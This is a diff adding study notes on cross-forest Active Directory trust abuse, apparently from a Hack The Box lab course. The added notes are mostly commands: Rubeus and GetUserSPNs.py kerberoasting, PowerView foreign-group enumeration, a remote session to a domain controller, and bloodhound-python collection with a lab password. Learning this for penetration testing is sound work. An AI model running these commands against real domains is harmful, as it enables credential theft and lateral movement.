@@ -266,3 +266,43 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 ```
 
 ## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+### Enumerating Accounts for Associated SPNs Using Get-DomainUser
+```
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+```
+### Enumerating the mssqlsvc Account
+```
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+```
+### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
+```
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+```
+### Admin Password Re-Use & Group Membership
+We can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as foreign group membership.
+###  Using Get-DomainForeignGroupMember
+```
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+```
+verifying the access
+Accessing DC03 Using Enter-PSSession
+```
+ Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
+```
+## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
+we can perform kerberoasting across a forest trust with GetUserSPNs.py from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the -target-domain flag in our command.
+```
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+Rerunning the command with the -request flag added gives us the TGS ticket. We could also add -outputfile <OUTPUT FILE> to output directly into a file that we could then turn around and run Hashcat against.
+```
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+### Hunting Foreign Group Membership with Bloodhound-python
+On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our resolv.conf file to run this tool(python Bloodhound on linux) since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of ACADEMY-EA-DC01 as the nameserver.
+<img width="410" alt="image" src="https://github.com/Kript0r3x/CPTS/assets/65650002/15bc4f1d-eeee-4ffb-9800-f94f0eef56a3">
+### Running bloodhound-python Against INLANEFREIGHT.LOCAL
+```
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+```
+repeat the same with the other forest.
